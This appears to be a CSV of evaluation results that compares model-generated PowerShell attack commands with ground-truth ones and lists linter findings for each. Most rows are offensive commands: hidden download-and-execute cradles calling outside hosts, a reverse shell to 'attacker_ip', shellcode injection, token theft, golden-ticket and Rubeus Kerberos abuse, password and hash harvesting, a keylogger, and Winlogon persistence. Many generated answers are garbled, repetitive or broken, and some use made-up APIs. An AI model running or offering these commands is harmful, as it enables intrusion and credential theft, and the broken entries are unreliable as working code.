Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -ErrorAction 'SilentlyContinue'; Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -ErrorAction 'SilentlyContinue'; Set-MpPreference -LogLocation 'C:\Users\Public\script.ps1' -Command 'Unspecified',$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2,[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ScriptBlockLoggingPreference' is assigned but never used. ""]",['Warning']
"Invoke-Shellcode -Shellcode @(0xC7,0xE9)","Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code'),[''],[''],[''],[''],[''],['']
Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -File C:\Users\Public\rundll32.exe,Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path},[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <file_path> -ScriptBlock {<xml_payload>},"${mwcpath}\${mwcname} ""${xml_payload}"" output.txt",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['UnexpectedToken '],"[""Unexpected token '\\${mwcname}' in expression or statement. ""]",['ParseError']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1""","powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",[''],[''],[''],[''],[''],['']
Get-NetIPResource -ComputerName < remote_host> -Domain < domain_name>,net view \\${remote.host.fqdn} /all,"['RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError']",[''],[''],['']
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name T1112 -Value ""<script>""","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')},Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
Get-ChildItem -Path .\current,dir,[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Import-Module .\Cert:\LocalMachine\Root\T1027.006\bin\T1027_006_remote.pfx -Force; ; $cert = ""C:\LocalMachine\Root\T1027_006_remote.pfx"";","$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'cert' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSI_p}' },Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },[''],[''],[''],[''],[''],['']
Invoke-ExecuteMSBuild,Invoke-ExecuteMSBuild,[''],[''],[''],[''],[''],['']
$wininit = Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'wininit' is assigned but never used. ""]",['Warning'],[''],[''],['']
Get-DomainComputer,Get-Domain,[''],[''],[''],[''],[''],['']
krbtgt.exe hash /domain:sub.domain.local /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe,ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,[''],[''],[''],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
"gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password' 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password4' 'Password5' 'Password6' 'Password","$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}","['TerminatorExpectedAtEndOfString ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingPositionalParameters ']","['The string is missing the terminator: "". ', "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" Cmdlet 'gp' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' Warning ', ' Warning ', ' Information']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Get-PassHashes -LocalFilePath 'C:\windows\psdrt\psdrt.dit',"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
$function = 'Get-Process'; $renamedFunction = $function + '-' + $renamedFunction; Invoke-Expression $renamedFunction,Function MyGetProc { Get-Process }; MyGetProc,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Rubeus.exe asktgs /service:cifs /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap,Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,[''],[''],[''],[''],[''],['']
"Invoke-SQLAudit -Verbose -Instance ""dcorp-mssql.dollarcorp.moneycorp.local""","Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -OU 1.2.840.113556.1.4.803:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0,Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',[''],[''],[''],[''],[''],['']
$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.txt -LogPath ${output_file},$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,['UnexpectedToken '],"[""Unexpected token '\\T1056.001\\src\\Get-Keystrokes.txt' in expression or statement. ""]",['ParseError'],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress},netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
"gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'","gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ""powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')""'",Find-DomainShare -CheckShareAccess,[''],[''],[''],[''],[''],['']
"(gci c:\ -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | Select-String -Pattern 'ip_hostname.txt'","$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt","['MissingEndParenthesisInExpression ', ' PSAvoidUsingCmdletAliases ']","[""Missing closing ')' in expression. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
"raiseChild.py < child_domain>/username@10.10.10.10 | select samaccountname , description , pwdlastset , logoncount , badpwdcount",raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,"['RedirectionNotSupported ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", "" 'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning']",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"$share = New-SmbShare -Name ""sharedir"" -Force; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://anyone.com/sharedir.ps1')","new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""","['PSAvoidUsingInvokeExpression ', ' PSUseDeclaredVarsMoreThanAssignments ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The variable 'share' is assigned but never used. ""]","['Warning ', ' Warning']",[''],[''],['']
"$stream = Get-Stream -Name 'evadump' ; Add-Type -TypeDefinition @' using System; using System.Runtime.InteropServices; public class EventStream { [DllImport('evadump.dll')] public static extern bool OpenStream(IntPtr hWndNewOwner); [DllImport('evadump.dll')] public static extern bool CloseStream(); [DllImport('evadump.dll')] public static extern IntPtr GetData(uint uFormat); [DllImport('evadump.dll')] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport('evadump.dll')] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport('evadump.dll')] public static extern int GlobalSize(IntPtr hMem); } ""@ $stream.OpenStream([IntPtr]::Zero) $stream.CloseStream()",$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,"['UnexpectedCharactersAfterHereStringHeader ', ' PSUseDeclaredVarsMoreThanAssignments ']","['No characters are allowed after a here-string header but before the end of the line. ', "" The variable 'stream' is assigned but never used. ""]","['ParseError ', ' Warning']",[''],[''],['']
"(gwmi -class Win32_User -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq ""Auto"" -and $_.PathName -notlike ""C:\Windows*"" -and $_.PathName -notlike '""*'} | select S-1-5-21-3263068140-2042698922-2891547269-1126",([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,"['MissingEndParenthesisInExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""Missing closing ')' in expression. "", "" 'Where' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']",[''],[''],['']
$path = 'C:\windows\psdrt\psdrt.dit'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($path); $sendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback,$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,"['UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSUseDeclaredVarsMoreThanAssignments ']","[""Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" The variable 'bytes' is assigned but never used. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Warning']",[''],[''],['']
"$script = 'Get-Process'; $buffer = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $script.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); powershell.exe -Command $encodedSendback $attacker_ip; $stream.Flush()}; $script.Close()",$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,"['MissingExpressionAfterToken ', ' UnexpectedToken ', ' MissingEndParenthesisInExpression ', ' UnexpectedToken ', ' PSAvoidUsingInvokeExpression ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSAvoidUsingPositionalParameters ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""Missing expression after ','. "", "" Unexpected token 'attacker_port' in expression or statement. "", "" Missing closing ')' in expression. "", "" Unexpected token ')' in expression or statement. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The variable 'buffer' is assigned but never used. "", "" Cmdlet 'New-Object' has positional parameter. Please use named parameters instead of positional parameters when calling a command. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Warning ', ' Warning ', ' Information ', ' Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-ForestGlobalCatalog -Forest local.domain ; Get-DomainTrust -SearchBase ""GC://$($ENV:USERDNSDOMAIN)""",Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
